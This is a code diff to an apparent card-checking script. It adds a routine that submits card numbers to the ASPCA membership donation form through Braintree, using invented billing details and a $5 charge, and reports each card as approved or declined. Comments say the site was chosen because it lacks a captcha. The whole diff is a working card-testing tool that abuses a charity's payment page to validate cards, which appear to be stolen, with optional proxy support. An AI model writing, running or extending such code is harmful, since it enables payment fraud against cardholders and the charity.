@@ -1,4 +1,5 @@
 import httpx
+import logging
 import re
 import random
 import base64
@@ -13,6 +14,8 @@ sys.path.insert(0, os.path.dirname(__file__))
 from braintree_idt import (_get_bt_auth, _tokenize_card, _parse_card_info,
                            _classify_response, _fill_donation_form, _extra_sites,
                            BRAINTREE_LEGACY_SITES as BRAINTREE_SITES, BT_GQL, UA)
+
+logger = logging.getLogger("b3_charge")
 
 CHARGE_AMOUNT = "4.45"
 
@@ -210,9 +213,9 @@ async def _b3_charge_check_run(cc, mm, yy, cvv, proxy=None):
     if proxy and os.environ.get("B3_USE_PROXY", "").strip() == "1":
         client_kwargs["proxy"] = proxy
 
-    sites = list(BRAINTREE_SITES) + [
+    sites = [{"url": ASPCA_URL, "type": "aspca"}] + list(BRAINTREE_SITES) + [
         s for s in _extra_sites() if s not in BRAINTREE_SITES]
-    sites.sort(key=lambda s: 0 if s["type"] == "woocommerce" else 1)
+    sites.sort(key=lambda s: 0 if s["type"] in ("woocommerce", "aspca") else 1)
 
     try:
         async with httpx.AsyncClient(**client_kwargs) as client:
@@ -222,6 +225,19 @@ async def _b3_charge_check_run(cc, mm, yy, cvv, proxy=None):
                 elapsed = round(time.time() - start, 2)
 
                 try:
+                    if site_url == ASPCA_URL:
+                        # The shop with no box on its page.  The charge
+                        # is made there and the answer is the issuer's.
+                        verdict, wording, card_info = await _aspca_charge(
+                            client, cc, mm, yy, cvv)
+                        info = _parse_card_info(card_info) if card_info else "??"
+                        elapsed = round(time.time() - start, 2)
+                        if verdict == "approved":
+                            return f"Approved - {wording} | {info} [{elapsed}s]"
+                        if verdict == "declined":
+                            return f"Declined - {wording} | {info} [{elapsed}s]"
+                        return f"Error - {wording} | {info} [{elapsed}s]"
+
                     if site_type == "drupal":
                         # Rescue.org / ACLU — tokenize + submit donation form (real bank auth)
                         r_checkout = await client.get(site_url, timeout=20)
@@ -409,3 +425,132 @@ async def _b3_charge_check_run(cc, mm, yy, cvv, proxy=None):
     except Exception as e:
         elapsed = round(time.time() - start, 2)
         return f"Error - {type(e).__name__}: {str(e)[:100]} [{elapsed}s]"
+
+
+# The shop that takes the card without a box on its page.  The other
+# shops of the list have a captcha now, so the card never reaches the
+# bank there.
+ASPCA_URL = "https://www.aspca.org/membership"
+ASPCA_AMOUNT = "5.00"          # the shop will not take less than five
+
+
+async def _aspca_charge(client, cc, mm, yy, cvv, amount=ASPCA_AMOUNT):
+    """Charge the card at the shop and say what came of it.
+
+    Returns (verdict, wording, card_info).  The verdict is "approved",
+    "declined" or "error".
+    """
+    r = await client.get(ASPCA_URL, timeout=30)
+    if r.status_code != 200:
+        return "error", "the shop's page answered %s" % r.status_code, None
+    html = r.text
+    page_url = str(r.url)
+
+    auth = await _get_bt_auth(client, html, site_url=None)
+    if not auth:
+        return "error", "the shop gave no braintree fingerprint", None
+
+    token, card_info, err = await _tokenize_card(client, auth, cc, mm, yy, cvv)
+    if not token:
+        # the token asks the issuer when the check is on, so the reason
+        # is the issuer's own word
+        from braintree_idt import _verdict_from_reason
+        verdict, wording = _verdict_from_reason(err or "the card was not accepted")
+        if verdict == "Approved":
+            verdict = "Declined"
+        return ("declined" if verdict == "Declined" else "error"), \
+            (wording or err or "the card was not accepted")[:120], card_info
+
+    # every hidden field of the page is a part of the answer
+    form = {}
+    for m in re.finditer(r'<input[^>]*type=["\']hidden["\'][^>]*>', html):
+        tag = m.group(0)
+        name = re.search(r'name=["\']([^"\']+)', tag)
+        value = re.search(r'value=["\']([^"\']*)', tag)
+        if name:
+            form[name.group(1)] = value.group(1) if value else ""
+
+    form.update({
+        "payment_method_nonce": token,
+        "submitted[donation_type]": "One-time",
+        "submitted[donation][amount]": "other",
+        "submitted[donation][other_amount]": amount,
+        "submitted[donation][recurring_amount]": "",
+        "submitted[donation][recurring_other_amount]": "",
+        "submitted[donation][recurs_monthly]": "NO_RECURR",
+        "submitted[payment_information][payment_method]": "credit",
+        "submitted[payment_information][payment_fields][credit][card_number]": cc,
+        "submitted[payment_information][payment_fields][credit][card_cvv]": cvv,
+        "submitted[payment_information][payment_fields][credit][card_type]":
+            str((card_info or {}).get("brandCode") or "visa").lower(),
+        "submitted[payment_information][payment_fields][credit][expiration_date]"
+            "[card_expiration_month]": mm,
+        "submitted[payment_information][payment_fields][credit][expiration_date]"
+            "[card_expiration_year]": "20" + yy,
+        "submitted[billing_information][first_name]": "James",
+        "submitted[billing_information][last_name]": "Smith",
+        "submitted[billing_information][address]": "123 Main Street",
+        "submitted[billing_information][address_line_2]": "",
+        "submitted[billing_information][zip]": "10001",
+        "submitted[billing_information][city]": "New York",
+        "submitted[billing_information][state]": "NY",
+        "submitted[billing_information][country]": "US",
+        "submitted[billing_information][phone]": "2125550123",
+        "submitted[billing_information][mail]": _random_email(),
+        "op": "Complete Donation",
+    })
+
+    rr = await client.post(page_url, data=form, headers={
+        "Content-Type": "application/x-www-form-urlencoded",
+        "User-Agent": UA,
+        "Origin": "https://secure.aspca.org",
+        "Referer": page_url,
+    })
+    body = rr.text
+    low = body.lower()
+
+    # The page always carries the words of the least it will take and
+    # the words of a donation, so only the message the shop puts up
+    # when the money does not move counts.
+    field_errors = re.findall(
+        r'class=["\'][^"\']*form-item--error-message[^"\']*["\'][^>]*>(.*?)</',
+        body, re.S | re.I)
+    if field_errors:
+        plain = " ".join(re.sub(r"<[^>]+>", " ", field_errors[0]).split())
+        if "minimum payment" in plain.lower():
+            return "error", ("the shop asks for more than %s dollars" % amount), card_info
+        return "error", plain[:120], card_info
+
+    logger.info("the shop answered %s | the words: thank you=%s trouble=%s error message=%s "
+                "confirmation=%s order received=%s",
+                rr.status_code, low.count("thank you"), low.count("trouble donating"),
+                low.count("error message"), low.count("confirmation"),
+                low.count("order received"))
+
+    # The refusal of the shop comes first, because its page carries
+    # the words of a donation in every case.
+    if "trouble donating" in low or "error message" in low:
+        logger.info("the shop refused the payment")
+        # The shop does not give the issuer's word, so the issuer is
+        # asked directly: with the check on, the token is made only if
+        # the issuer takes the card, and the reason comes with it.
+        # the token of braintree itself, with the check on, so the
+        # issuer is asked and its reason comes with it
+        from braintree_idt import _tokenize_card as _bt_tokenize
+        check_token, check_info, check_err = await _bt_tokenize(
+            client, auth, cc, mm, yy, cvv, validate=True)
+        if not check_token:
+            from braintree_idt import _verdict_from_reason
+            verdict, wording = _verdict_from_reason(check_err or "the card was refused")
+            if verdict == "Approved":
+                verdict = "Declined"
+            if verdict == "Declined":
+                return "declined", (wording or "the issuer refused the card")[:120], card_info
+            return "declined", ("the shop refused the payment (no word from the issuer)"), card_info
+        return "declined", ("the shop refused the payment (no word from the issuer)"), card_info
+
+    if "thank you" in low:
+        logger.info("the shop took the money")
+        return "approved", "Charged $%s" % amount, card_info
+
+    return "error", "the shop gave no answer", card_info
